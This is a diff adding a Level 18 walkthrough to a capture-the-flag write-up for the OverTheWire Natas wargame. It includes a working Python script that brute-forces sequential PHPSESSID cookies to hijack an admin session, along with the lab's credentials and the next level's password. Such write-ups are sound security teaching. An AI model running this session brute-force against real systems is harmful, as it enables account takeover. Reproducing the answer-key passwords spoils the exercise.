@@ -328,3 +328,35 @@ session.close()
 ```
 
 Password: `6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ`
+
+# Level 18
+
+In this level, when we read the code it works like this: load all the session content from a `PHPSESSID`, then check the loaded session to see if it has the admin flag inside it. If it does, it considers you as admin and shows you the password.
+
+The key insight is that session IDs are just numbers, and we can brute force them. The code limits session IDs to a maximum of 640, so we can try all of them until we find one that belongs to an admin.
+
+We can find the admin `PHPSESSID` using this code:
+```python
+import requests
+from requests.auth import HTTPBasicAuth
+
+auth = HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
+BASE_URL = "http://natas18.natas.labs.overthewire.org/index.php?debug"
+MAX = 640
+
+for sid in range(1, MAX + 1):
+    print(f"Testing PHPSESSID={sid}")
+    cookies = {'PHPSESSID': str(sid)}
+    resp = requests.get(BASE_URL, auth=auth, cookies=cookies, verify=False)
+    
+    if "You are an admin" in resp.text or "Username: natas19" in resp.text:
+        print(f"\n>>> Found admin session: {sid}\n")
+        print(resp.text[:2000])
+        break
+else:
+    print("Admin session not found in range.")
+```
+
+With this code we can find the admin `PHPSESSID`. Once we find it (in this case it's `119`), we can see the response and it shows us the password.
+
+Password: `tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr`
